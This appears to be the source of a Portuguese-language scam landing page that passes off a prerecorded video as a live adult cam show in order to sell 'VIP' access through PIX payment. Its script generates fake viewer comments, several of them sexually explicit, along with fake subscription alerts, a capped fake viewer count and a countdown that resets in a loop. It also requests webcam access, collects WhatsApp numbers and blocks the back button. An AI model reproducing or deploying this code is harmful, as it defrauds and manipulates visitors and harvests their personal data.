</linearGradient>
<linearGradient id="paint32_linear" x1="18.2212" y1="7.12277" x2="18.0138" y2="4.7193" gradientUnits="userSpaceOnUse">
<stop offset="0.00132565" stop-color="#4B8C1C"/>
<stop offset="0.2325" stop-color="#5EA12C"/>
<stop offset="0.7361" stop-color="#82C94A"/>
<stop offset="0.9973" stop-color="#90D856"/>
</linearGradient>
<linearGradient id="paint33_linear" x1="21.4508" y1="3.89284" x2="20.9193" y2="2.11195" gradientUnits="userSpaceOnUse">
<stop stop-color="#C20000"/>
<stop offset="0.076599" stop-color="#C80400"/>
<stop offset="0.6838" stop-color="#F02300"/>
<stop offset="0.9987" stop-color="#FF2F00"/>
</linearGradient>
<radialGradient id="paint34_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(18.0797 5.93728) rotate(-48.0016) scale(6.19656 0.70733)">
<stop stop-color="#440063" stop-opacity="0.75"/>
<stop offset="1" stop-color="#420061" stop-opacity="0"/>
</radialGradient>
<radialGradient id="paint35_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(17.6841 4.99078) rotate(-41.9287) scale(6.19552 0.707224)">
<stop stop-color="white" stop-opacity="0.5"/>
<stop offset="1" stop-color="white" stop-opacity="0"/>
</radialGradient>
<linearGradient id="paint36_linear" x1="14.799" y1="7.0497" x2="16.0056" y2="7.13275" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-opacity="0"/>
</linearGradient>
<radialGradient id="paint37_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(14.5688 5.12386) rotate(53.4345) scale(2.34677 1.06031)">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAE"/>
<stop offset="0.4317" stop-color="#B455B1"/>
<stop offset="0.6112" stop-color="#AB43B5"/>
<stop offset="0.7816" stop-color="#9F2BBC"/>
<stop offset="0.9442" stop-color="#8E0CC4"/>
<stop offset="1" stop-color="#8800C7"/>
</radialGradient>
<linearGradient id="paint38_linear" x1="10.2187" y1="5.78934" x2="10.2869" y2="8.90847" gradientUnits="userSpaceOnUse">
<stop/>
<stop offset="1" stop-opacity="0"/>
</linearGradient>
<radialGradient id="paint39_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(8.26016 2.90991) scale(5.55203)">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAE"/>
<stop offset="0.4317" stop-color="#B455B1"/>
<stop offset="0.6112" stop-color="#AB43B5"/>
<stop offset="0.7816" stop-color="#9F2BBC"/>
<stop offset="0.9442" stop-color="#8E0CC4"/>
<stop offset="1" stop-color="#8800C7"/>
</radialGradient>
<linearGradient id="paint40_linear" x1="7.60967" y1="2.0048" x2="10.7459" y2="7.11815" gradientUnits="userSpaceOnUse">
<stop stop-color="#BB62AD"/>
<stop offset="0.2371" stop-color="#B95FAD"/>
<stop offset="0.4317" stop-color="#B155AC"/>
<stop offset="0.6112" stop-color="#A443AA"/>
<stop offset="0.7816" stop-color="#912BA7"/>
<stop offset="0.9442" stop-color="#7A0CA4"/>
<stop offset="1" stop-color="#7000A3"/>
</linearGradient>
<radialGradient id="paint41_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(13.5047 7.45695) rotate(-8.89908) scale(5.98799)">
<stop stop-color="white"/>
<stop offset="1" stop-color="#E0DBEC"/>
</radialGradient>
<radialGradient id="paint42_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(13.6769 5.35213) rotate(91.7082) scale(6.94405 4.01804)">
<stop stop-color="#FC5B54" stop-opacity="0"/>
<stop offset="0.12" stop-color="#EB4E65" stop-opacity="0.12"/>
<stop offset="0.5274" stop-color="#B6249A" stop-opacity="0.5274"/>
<stop offset="0.8331" stop-color="#950ABB" stop-opacity="0.8331"/>
<stop offset="1" stop-color="#8800C7"/>
</radialGradient>
</defs>
        </svg>ENVIAR
        </button>

        </div>
    </div>

    <!-- Main Video Container -->
    <div class="video-container">
        <!-- Loading GIF (shown initially) -->
        <img id="loadingGif" src="/carregando-11.gif" alt="Carregando..." style="width: 100%; height: 100%; object-fit: cover; z-index: 2;">
        
        <!-- Actual video (hidden initially) -->
        <video id="liveVideo" playsinline autoplay muted style="display: none; width: 100%; height: 100%; object-fit: cover; z-index: 1;">
            <source src="/live/live-fernanda.mp4" type="video/mp4">
        </video>
    </div>

    <!-- User Camera -->
    <div class="user-camera-container">
        <video id="userCamera" playsinline autoplay muted></video>
        <div class="camera-overlay" id="cameraOverlay">
            <p>Apenas VIP pode ativar câmera</p>
        </div>
        <div class="camera-denied" id="cameraDenied" style="display: none;">
            <p>CAMERA NEGADA</p>
            <p>toque aqui para permitir novamente</p>
        </div>
    </div>

    <!-- Comments Container -->
    <div class="comments-container" id="commentsContainer"></div>

    <!-- Comment Notification -->
    <div class="comment-notification" id="commentNotification">
        Envie um presente para comentar
    </div>

    <!-- Notification Container -->
    <div class="notification" id="notification" style="display: none;">
        <i class="fas fa-check-circle"></i>
        <span id="notification-text"></span>
    </div>

    <!-- Bottom Controls -->
    <div class="bottom-controls">
        <div class="interaction-buttons">
            <button class="interaction-button" id="likeButton">
                <i class="fas fa-heart" style="color: var(--primary-color);"></i>
                <span class="interaction-count" id="likes-count">25</span>
            </button>
        </div>
        <input type="text" class="comment-input" id="commentInput" placeholder="Deixe um comentário...">
    </div>

    <!-- Phone Input Container -->
    <div class="payment-container" id="phoneContainer">
        <h3>Conecte-se para Participar</h3>
        <div class="divider"></div>
        <h2>Digite seu Whatsapp</h2>
        
        <div class="phone-input-container">
            <input type="tel" id="phoneInput" placeholder="+55 (__) _____ - ____" maxlength="15" class="phone-input">
            <p class="input-error" id="phoneError" style="display: none;">Digite um número válido</p>
        </div>
        
        <button class="copy-button" onclick="validateAndSubmitPhone()">
            <i class="fas fa-arrow-right"></i> Continuar
        </button>
    </div>
    
    <!-- Payment Container -->
    <div class="payment-container" id="paymentContainer">
        <div class="countdown-timer">
    <div class="timer-label">OFERTA EXPIRA EM</div>
    <div class="timer-container">
        <div class="timer-unit">
            <div class="flip-card" id="minutes-tens">
                <div class="top">1</div>
                <div class="bottom">1</div>
            </div>
            <div class="flip-card" id="minutes-ones">
                <div class="top">5</div>
                <div class="bottom">5</div>
            </div>
            <div class="timer-separator">:</div>
            <div class="flip-card" id="seconds-tens">
                <div class="top">0</div>
                <div class="bottom">0</div>
            </div>
            <div class="flip-card" id="seconds-ones">
                <div class="top">0</div>
                <div class="bottom">0</div>
            </div>
        </div>
        <div class="timer-text">minutos : segundos</div>
    </div>
</div>
        <h2>R$ <?php echo $valorFormatado; ?></h2>
        
        <div class="qr-code-img">
            <img src="<?php echo $imgpix; ?>" alt="QR Code PIX" id="qrCodeImg">
        </div>
        <div class="pix-code" id="pixCode" onclick="copyPixCode()"><?php echo $pixqr; ?></div>
        <button class="copy-button" onclick="copyPixCode()">
            <i class="fas fa-copy"></i> Copiar PIX
        </button>
        <p class="payment-note">Copie o código PIX e pague pelo seu banco. O acesso VIP será liberado após o pagamento.</p>
        
        <div id="statusPagamento" class="status-pending">
            <span class="loaderSpinner"></span> Aguardando pagamento...
        </div>
    </div>

    <!-- Copy notification -->
    <div id="copyMessage">
        <i class="fas fa-check-circle"></i>
        <span>Código PIX copiado com sucesso!</span>
    </div>

    <!-- Audio Alert -->
    <div class="audio-alert" id="audioAlert">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="speaker-muted-icon">
            <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
            <line x1="23" y1="9" x2="17" y2="15"></line>
            <line x1="17" y1="9" x2="23" y2="15"></line>
        </svg>
        <p>Ative o som para assistir ao vivo</p>
        <button onclick="enableAudio()">Ativar Som</button>
    </div>

    <script>
        // DOM Elements
        const liveVideo = document.getElementById('liveVideo');
        const userCamera = document.getElementById('userCamera');
        const cameraOverlay = document.getElementById('cameraOverlay');
        const cameraDenied = document.getElementById('cameraDenied');
        const commentsContainer = document.getElementById('commentsContainer');
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notification-text');
        const vipCounter = document.getElementById('vip-counter');
        const likesCount = document.getElementById('likes-count');
        const likeButton = document.getElementById('likeButton');
        const commentInput = document.getElementById('commentInput');
        const commentNotification = document.getElementById('commentNotification');
        const phoneContainer = document.getElementById('phoneContainer');
        const paymentContainer = document.getElementById('paymentContainer');
        const qrCodeImg = document.getElementById('qrCodeImg');
        const pixCode = document.getElementById('pixCode');
        const audioAlert = document.getElementById('audioAlert');
        const statusPagamento = document.getElementById('statusPagamento');
        const buyVipButton = document.getElementById('buyVipButton');
        const loadingGif = document.getElementById('loadingGif');
        
        // Variables to track state
        let vipCount = 8; // Changed from 85 to 3
        let likesValue = 25;
        let notificationsInterval;
        let commentsInterval;
        let audioEnabled = false;
        let videoStarted = false;
        let cameraAllowed = false;
        let typebotClosed = false;
        let typebotOpened = false;
        let transactionId = "<?php echo $transactionId; ?>";
        let checkInterval = 3000; // Check every 2 seconds
        let maxVideoDuration = 240; // 4 minutes in seconds
        let videoStartTime = 0;
        let videoCurrentTime = 0;

        // Sample data
        const names = [
            'Victor', 'Bruno', 'Roger', 'Diego', 'Edvaldo', 
            'Felipe', 'Gilberto', 'Ryan', 'Israel', 'João',
            'Mateus', 'Lucas', 'Adão', 'Natan', 'Fabiano',
            'Paulo', 'Wagner', 'Rafael', 'Raul', 'Thiago'
        ];

        const comments = [
            'linda demais 😍',
            'Gostei do VIP 🔥',
            'Manda beijo pra mim ❤️',
            'De qual cidade você é',
            'Arregaça essa bucetinha gostosa',
            'maravilhosa!',
            'Assinei o VIP agora, q delícia 💯',
            'Amo suas lives 24h',
            'Linda maravilhosa', 
            'Gatinha maravilhosa', 
            'Te chamei no wpp gata', 
            'De onde você é gata',
            'Adorei o show de ontem',
            'Bixa boa da porra Vey!', 
            'Mostra seu cuzinho',
            'Que gata linda',
            'Bucetinha molhadinha mb', 
            'Que peitos gostoso', 
            'Cada vez mais bela', 
            'Que delícia amor',
            'Querida te fiz pedido de amizade, e estou assistindo os teus vídeos, você fode bem, quero também foder com você',
            'Poderia dar uma voltinha  bb', 
            'Temho uns vídeos dela que e uma delícia',
            'Como todo respeito,vc e muito linda pqp', 
            'Gatinha',
        ];

        const avatars = [
            'https://livemodelo.com/pics/profile1.jpg',
            'https://livemodelo.com/pics/profile2.jpg',
            'https://livemodelo.com/pics/profile3.jpg',
            'https://livemodelo.com/pics/profile4.jpg',
            'https://livemodelo.com/pics/profile5.jpg',
            'https://livemodelo.com/pics/profile6.jpg',
            'https://livemodelo.com/pics/profile7.jpg',
            'https://livemodelo.com/pics/profile8.jpg',
            'https://livemodelo.com/pics/profile9.jpg'
        ];

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            // Request camera access
            requestCameraAccess();
            
            // Initialize video
            initializeVideo();
            
            // Setup event listeners
            setupEventListeners();
            
            // Listen for Typebot chat events
            setupTypebotListener();
            
            // Make camera draggable
            makeCameraDraggable();
            
            // Update typebot button visibility
            updateTypebotButtonVisibility();
        });

        // Function to setup event listeners
        function setupEventListeners() {
            // Comment input click event
            commentInput.addEventListener('click', showCommentNotification);
            
            // Like button click event
            likeButton.addEventListener('click', handleLikeClick);
            
            // Buy VIP button
            buyVipButton.addEventListener('click', showPhoneContainer);
            
            // Camera denied retry
            cameraDenied.addEventListener('click', requestCameraAccess);
            
            // Video ended event
            liveVideo.addEventListener('ended', () => {
                if (!typebotOpened || (typebotOpened && typebotClosed)) {
                    showPhoneContainer();
                }
            });
            
            // Video timeupdate event to track progress
            liveVideo.addEventListener('timeupdate', updateVideoProgress);
            
            // Add input event for phone formatting
            document.getElementById('phoneInput').addEventListener('input', function() {
                formatPhoneNumber(this);
            });
        }

        // Function to update video progress
        function updateVideoProgress() {
            if (!videoStarted) return;
            
            videoCurrentTime = Math.floor(liveVideo.currentTime);
        }

        // Function to request camera access
        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    userCamera.srcObject = stream;
                    cameraAllowed = true;
                    cameraOverlay.style.display = 'flex';
                    cameraDenied.style.display = 'none';
                })
                .catch(err => {
                    console.error("Camera access denied: ", err);
                    cameraAllowed = false;
                    cameraOverlay.style.display = 'none';
                    cameraDenied.style.display = 'flex';
                });
        }

        // Function to initialize video
        function initializeVideo() {
            // Display loading GIF initially
            loadingGif.style.display = 'block';
            liveVideo.style.display = 'none';
            
            // Show audio prompt immediately
            setTimeout(() => {
                showAudioAlert();
            }, 10);
            
            // Add click event to unmute video
            loadingGif.addEventListener('click', () => {
                enableAudio();
            });
        }

        // Function to show audio alert
        function showAudioAlert() {
            audioAlert.style.display = 'flex';
        }

        // Function to enable audio and start video
        function enableAudio() {
            // Hide the loading GIF and show video
            loadingGif.style.display = 'none';
            liveVideo.style.display = 'block';
            
            // Enable audio and start the video
            liveVideo.muted = false;
            liveVideo.volume = 1;
            liveVideo.classList.add('active');
            liveVideo.play();
            
            // Hide the audio alert
            audioAlert.style.display = 'none';
            
            // Set state
            audioEnabled = true;
            videoStarted = true;
            videoStartTime = Date.now();
            
            // Start comments and notifications
            startComments();
            startNotifications();
            
            // Start checking payment status
            startCheckingPaymentStatus();
        }

        // Function to start fake comments
        function startComments() {
            showComment(); // Show first comment immediately
            commentsInterval = setInterval(showComment, getRandomTime(5000, 15000));
        }

        // Function to show a single comment
        function showComment() {
            if (!videoStarted) return;
            
            const commentElement = document.createElement('div');
            commentElement.className = 'comment';
            
            const randomName = names[Math.floor(Math.random() * names.length)];
            const randomComment = comments[Math.floor(Math.random() * comments.length)];
            const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];
            
            // Randomly add VIP tag to some comments
            const showVipTag = Math.random() > 0.5;
            const vipTagHtml = showVipTag ? '<span class="vip-tag"><i class="fas fa-crown"></i> VIP</span>' : '';
            
            commentElement.innerHTML = `
                <img src="${randomAvatar}" class="comment-avatar">
                <div class="comment-text">
                    <span class="commenter-name">${randomName}</span>${vipTagHtml}
                    <div>${randomComment}</div>
                </div>
            `;
            
            commentsContainer.appendChild(commentElement);
            
            // Remove comment after animation completes
            setTimeout(() => {
                commentElement.remove();
            }, 5000);
        }

        // Function to start fake notifications
        function startNotifications() {
            showNotification(); // Show first notification immediately
            notificationsInterval = setInterval(showNotification, getRandomTime(5000, 10000));
        }

        // Function to show a VIP subscription notification
        function showNotification() {
            if (!videoStarted) return;
            
            const randomName = names[Math.floor(Math.random() * names.length)];
            notificationText.textContent = `${randomName} ASSINOU O VIP`;
            notification.style.display = 'flex';
            
            // Update viewer counter - limited to max 9
            if (vipCount < 9) { // Changed to limit at 9
                vipCount++;
                vipCounter.textContent = vipCount;
            }
            
            // Hide notification after animation
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // Function to show comment notification
        function showCommentNotification() {
            commentNotification.classList.add('show');
            
            setTimeout(() => {
                commentNotification.classList.remove('show');
            }, 2000);
        }

        // Function to handle like button click - Modified to work without limits
        function handleLikeClick() {
            likesValue++;
            updateLikesDisplay();
            
            // Add heart animation
            const heart = document.createElement('div');
            heart.className = 'heart-animation';
            heart.style.cssText = `
                position: fixed;
                bottom: 60px;
                left: 30px;
                font-size: 28px;
                color: var(--primary-color);
                animation: floatUp 1.5s forwards;
                z-index: 1000;
                opacity: 0;
            `;
            heart.innerHTML = '<i class="fas fa-heart"></i>';
            document.body.appendChild(heart);
            
            // Remove heart after animation
            setTimeout(() => {
                heart.remove();
            }, 1500);
        }

        // Function to update likes display
        function updateLikesDisplay() {
            likesCount.textContent = likesValue;
            
            // Add pulse animation
            likesCount.style.animation = 'none';
            setTimeout(() => {
                likesCount.style.animation = 'pulse 0.5s';
            }, 10);
            
            // Add animation keyframes if not already added
            if (!document.querySelector('#likes-animation-keyframes')) {
                const style = document.createElement('style');
                style.id = 'likes-animation-keyframes';
                style.innerHTML = `
                    @keyframes pulse {
                        0% { transform: scale(1); }
                        50% { transform: scale(1.3); }
                        100% { transform: scale(1); }
                    }
                `;
                document.head.appendChild(style);
            }
        }

        // Function to show phone input container
        function showPhoneContainer() {
            // Only show the container if chat is not open
            if (!typebotOpened) {
                phoneContainer.classList.add('active');
            }
        }
        
        // Function to show payment container
        function showPaymentContainer() {
            phoneContainer.classList.remove('active');
            paymentContainer.classList.add('active');
        }
        
        // Function to validate and format phone number
        function formatPhoneNumber(input) {
            // Remove all non-digits
            let value = input.value.replace(/\D/g, '');
            
            // Format as (XX) XXXXX-XXXX
            if (value.length <= 2) {
                input.value = value.length ? `(${value}` : value;
            } else if (value.length <= 7) {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
            } else if (value.length <= 11) {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7)}`;
            } else {
                input.value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7, 11)}`;
            }
        }
        
        // Function to validate and submit phone
        function validateAndSubmitPhone() {
            const phoneInput = document.getElementById('phoneInput');
            const phoneError = document.getElementById('phoneError');
            const phoneValue = phoneInput.value.replace(/\D/g, '');
            
            // Check if phone number is valid (10 or 11 digits for Brazil)
            if (phoneValue.length < 10 || phoneValue.length > 11) {
                phoneError.style.display = 'block';
                return;
            }
            
            // Hide error message
            phoneError.style.display = 'none';
            
            // Save the phone number to database (in a real implementation, this would be an AJAX request)
            savePhoneNumber(phoneInput.value);
            
            // Show payment container
            showPaymentContainer();
        }
        
        // Function to save phone number to database
        function savePhoneNumber(phoneNumber) {
            console.log('Phone number saved:', phoneNumber);
            
            // In a real implementation, you would send this to your server with fetch or XMLHttpRequest
            fetch('save_phone.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ phone: phoneNumber }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Function to copy PIX code
        function copyPixCode() {
            const code = document.getElementById('pixCode').textContent;
            navigator.clipboard.writeText(code).then(() => {
                // Show copy notification
                const copyMessage = document.getElementById('copyMessage');
                copyMessage.style.display = 'flex';
                setTimeout(() => {
                    copyMessage.style.display = 'none';
                }, 3000);
            }).catch(err => {
                console.error('Erro ao copiar: ', err);
            });
        }

        // Function to start checking payment status
        function startCheckingPaymentStatus() {
            checkTransactionStatus();
        }

        // Function to check transaction status
        function checkTransactionStatus() {
            if (!transactionId) {
                console.log("Aguardando o ID da transação...");
                setTimeout(checkTransactionStatus, checkInterval);
                return;
            }

            const url = `verificar_status.php?transaction_id=${transactionId}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log(`Status da transação: ${data.status}`);
                    
                    if (data.status === "PAID") {
                        // Atualiza o status visual
                        statusPagamento.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado! Redirecionando...';
                        statusPagamento.classList.remove("status-pending");
                        statusPagamento.classList.add("status-success");
                        
                        // Redireciona após 2 segundos
                        setTimeout(() => {
                            window.location.href = "bianca.html"; // Página de destino após pagamento
                        }, 2000);
                    } else {
                        // Continua verificando
                        setTimeout(checkTransactionStatus, checkInterval);
                    }
                })
                .catch(error => {
                    console.error("Erro ao verificar o status:", error);
                    setTimeout(checkTransactionStatus, checkInterval);
                });
        }

        // Function to setup Typebot listener
        function setupTypebotListener() {
            window.addEventListener('message', (event) => {
                try {
                    // Check if the message is from Typebot
                    if (event.data && (event.data.source === 'typebot' || event.data.from === 'typebot')) {
                        console.log('Received message from Typebot:', event.data);
                        
                        // Check for chat opened events
                        if (event.data.type === 'chatOpened' || event.data.event === 'chatOpened') {
                            console.log('Typebot chat opened');
                            typebotOpened = true;
                            typebotClosed = false;
                        }
                        
                        // Check for chat closed events
                        if (event.data.type === 'chatClosed' || event.data.event === 'chatClosed') {
                            console.log('Typebot chat closed');
                            typebotClosed = true;
                            typebotOpened = false;
                            
                            // Only show the phone container if chat was opened and then closed
                            if (typebotOpened) {
                                setTimeout(() => {
                                    showPhoneContainer();
                                }, 1000);
                            }
                        }
                    }
                } catch (error) {
                    console.error('Error processing message event:', error);
                }
            });
        }

        // Function to make camera draggable - MODIFIED to position on the right side
        function makeCameraDraggable() {
            const camera = document.querySelector('.user-camera-container');
            let isDragging = false;
            let offsetX, offsetY;

            // Position initially on the right side above the comment input
            const initialPosition = () => {
                const commentInput = document.getElementById('commentInput');
                const inputRect = commentInput.getBoundingClientRect();
                
                camera.style.position = 'absolute';
                camera.style.bottom = 'auto';
                camera.style.left = 'auto';
                camera.style.right = '10px';
                camera.style.top = (inputRect.top - camera.offsetHeight - 5) + 'px';
            };
            
            // Call initially
            initialPosition();
            
            // Recalculate on window resize
            window.addEventListener('resize', initialPosition);

            // Mouse events for desktop
            camera.addEventListener('mousedown', startDrag);
            document.addEventListener('mousemove', drag);
            document.addEventListener('mouseup', endDrag);

            // Touch events for mobile
            camera.addEventListener('touchstart', startDragTouch);
            document.addEventListener('touchmove', dragTouch);
            document.addEventListener('touchend', endDrag);

            function startDrag(e) {
                e.preventDefault();
                isDragging = true;
                offsetX = e.clientX - camera.getBoundingClientRect().left;
                offsetY = e.clientY - camera.getBoundingClientRect().top;
                camera.classList.add('dragging');
            }

            function startDragTouch(e) {
                const touch = e.touches[0];
                isDragging = true;
                offsetX = touch.clientX - camera.getBoundingClientRect().left;
                offsetY = touch.clientY - camera.getBoundingClientRect().top;
                camera.classList.add('dragging');
            }

            function drag(e) {
                if (!isDragging) return;
                e.preventDefault();
                
                const x = e.clientX - offsetX;
                const y = e.clientY - offsetY;
                
                // Ensure it stays within viewport bounds
                const maxX = window.innerWidth - camera.offsetWidth;
                const maxY = window.innerHeight - camera.offsetHeight;
                
                // Check for collision with other elements
                if (!isColliding(x, y)) {
                    camera.style.left = `${Math.max(0, Math.min(maxX, x))}px`;
                    camera.style.top = `${Math.max(0, Math.min(maxY, y))}px`;
                    camera.style.right = 'auto';
                    camera.style.bottom = 'auto';
                }
            }

            function dragTouch(e) {
                if (!isDragging) return;
                
                const touch = e.touches[0];
                const x = touch.clientX - offsetX;
                const y = touch.clientY - offsetY;
                
                // Ensure it stays within viewport bounds
                const maxX = window.innerWidth - camera.offsetWidth;
                const maxY = window.innerHeight - camera.offsetHeight;
                
                // Check for collision with other elements
                if (!isColliding(x, y)) {
                    camera.style.left = `${Math.max(0, Math.min(maxX, x))}px`;
                    camera.style.top = `${Math.max(0, Math.min(maxY, y))}px`;
                    camera.style.right = 'auto';
                    camera.style.bottom = 'auto';
                }
            }

            function endDrag() {
                isDragging = false;
                camera.classList.remove('dragging');
            }
            
            // Simple collision detection with important elements
            function isColliding(x, y) {
                const cameraWidth = camera.offsetWidth;
                const cameraHeight = camera.offsetHeight;
                
                // Define important elements to avoid
                const elements = [
                    document.querySelector('.header'),
                    document.querySelector('.bottom-controls'),
                    document.getElementById('notification'),
                    document.getElementById('commentNotification')
                ].filter(el => el !== null);
                
                // Check for collision with each element
                for (const element of elements) {
                    const rect = element.getBoundingClientRect();
                    
                    if (
                        x < rect.right &&
                        x + cameraWidth > rect.left &&
                        y < rect.bottom &&
                        y + cameraHeight > rect.top
                    ) {
                        return true; // Collision detected
                    }
                }
                
                return false;
            }
        }

        // Function to update typebot button visibility
        function updateTypebotButtonVisibility() {
            setTimeout(() => {
                const typebotButton = document.getElementById('typebot-bubble-button');
                
                if (!typebotButton) return;
                
                const checkContainers = () => {
                    if (phoneContainer.classList.contains('active') || paymentContainer.classList.contains('active')) {
                        typebotButton.style.opacity = '1';
                        typebotButton.style.pointerEvents = 'all';
                        typebotButton.style.top = '80px';
                    } else {
                        typebotButton.style.opacity = '0';
                        typebotButton.style.pointerEvents = 'none';
                    }
                };
                
                // Create a MutationObserver to watch for class changes
                const observer = new MutationObserver(mutations => {
                    mutations.forEach(mutation => {
                        if (mutation.attributeName === 'class') {
                            checkContainers();
                        }
                    });
                });
                
                // Start observing the containers
                observer.observe(phoneContainer, { attributes: true });
                observer.observe(paymentContainer, { attributes: true });
                
                // Initial check
                checkContainers();
            }, 1000); // Give time for Typebot to initialize
        }

        // Helper function to get random time
        function getRandomTime(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        // Timer Elements
const minutesTens = document.getElementById('minutes-tens');
const minutesOnes = document.getElementById('minutes-ones');
const secondsTens = document.getElementById('seconds-tens');
const secondsOnes = document.getElementById('seconds-ones');

// Function to initialize countdown timer
function initCountdownTimer() {
    // Set initial time: 15 minutes
    let totalSeconds = 15 * 60;
    
    // Update the timer display initially
    updateTimerDisplay(totalSeconds);
    
    // Start the countdown
    const timerInterval = setInterval(() => {
        totalSeconds--;
        
        if (totalSeconds <= 0) {
            clearInterval(timerInterval);
            // You can add behavior for when timer reaches zero
            totalSeconds = 15 * 60; // Reset to 15 minutes (loop the timer)
        }
        
        updateTimerDisplay(totalSeconds);
    }, 1000);
}

// Function to update timer display with flip animation
function updateTimerDisplay(totalSeconds) {
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    
    const minutesTensDigit = Math.floor(minutes / 10);
    const minutesOnesDigit = minutes % 10;
    const secondsTensDigit = Math.floor(seconds / 10);
    const secondsOnesDigit = seconds % 10;
    
    // Update minutes tens digit with animation if changed
    if (minutesTens.querySelector('.top').textContent != minutesTensDigit) {
        flipDigit(minutesTens, minutesTensDigit);
    }
    
    // Update minutes ones digit with animation if changed
    if (minutesOnes.querySelector('.top').textContent != minutesOnesDigit) {
        flipDigit(minutesOnes, minutesOnesDigit);
    }
    
    // Update seconds tens digit with animation if changed
    if (secondsTens.querySelector('.top').textContent != secondsTensDigit) {
        flipDigit(secondsTens, secondsTensDigit);
    }
    
    // Update seconds ones digit with animation if changed
    if (secondsOnes.querySelector('.top').textContent != secondsOnesDigit) {
        flipDigit(secondsOnes, secondsOnesDigit);
    }
}

// Function to flip a digit with animation
function flipDigit(digitElement, newValue) {
    // Add flipping class to trigger animation
    digitElement.classList.add('flipping');
    
    // Update the digit value halfway through the animation
    setTimeout(() => {
        digitElement.querySelector('.top').textContent = newValue;
        digitElement.querySelector('.bottom').textContent = newValue;
        
        // Remove the flipping class after animation completes
        setTimeout(() => {
            digitElement.classList.remove('flipping');
        }, 250);
    }, 250);
}

// Inicialize o cronômetro (chamado no final do setupEventListeners)
initCountdownTimer();
    </script>
    <script>
(function () {
  const redirectUrl = 'https://livemodelo.com/menu/homehome3.php';  // mesmo URL acima

  // 1️⃣ Impede que o usuário use o botão VOLTAR para retornar a esta página.
  history.pushState(null, '', location.href);
  window.addEventListener('popstate', function () {
    location.replace(redirectUrl);
  });

  // 2️⃣ Caso ele tente atualizar ou fechar/abrir de novo (F5 / Ctrl+R / recarregar),
  //    o backend já bloqueia via PHP, mas este event listener reforça a intenção
  //    de saída antes do servidor responder.
  window.addEventListener('beforeunload', function () {
    // Nada precisa ser feito aqui além de deixar o PHP cuidar do redirect
    // na próxima requisição. Este handler existe apenas para cobrir algumas
    // implementações de navegador mais antigas.
  });
})();
</script>
    
</body>
</html>